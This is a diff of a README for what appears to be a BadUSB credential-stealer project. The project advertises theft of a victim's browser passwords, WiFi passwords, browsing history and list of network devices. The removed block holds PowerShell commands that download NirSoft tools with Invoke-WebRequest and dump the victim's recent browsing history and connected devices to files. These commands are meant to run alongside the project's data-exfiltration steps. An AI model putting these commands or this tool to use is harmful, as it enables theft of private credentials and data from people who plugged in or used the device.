@@ -7,16 +7,8 @@ Everything in this repository is **strictly** for educational purposes. **I am n
 This **script** allows you to steal the following **information**:
 * Browser **passwords** (Chrome, Firefox, Opera);
 * **WiFi** passwords;
-* You can add this information (browser history from the last 7 days and a list of all devices connected to the victim's network) by including the following commands to [ps.ps1](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/upload/ps.ps1):
-  ```
-    # These commands should be placed after downloading other required files
-    Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe # Download the NirSoft tool for browser history
-    Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe # Download the NirSoft tool for connected devices
-
-    # These commands should be placed after the other data exfiltration commands
-    .\WNetWatcher.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_connected_devices.txt # Create the file for connected devices
-    .\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_history.txt # Create the file for browser history
-  ```
+* Browser **history** from the last 7 days
+* A **list** of all **devices** connected to the victim's network
 
 ### Attention Arduino users!
 I stopped upgrading .ino scripts. If you want, you can convert Ducky Scripts [here](https://duckify.huhn.me/).
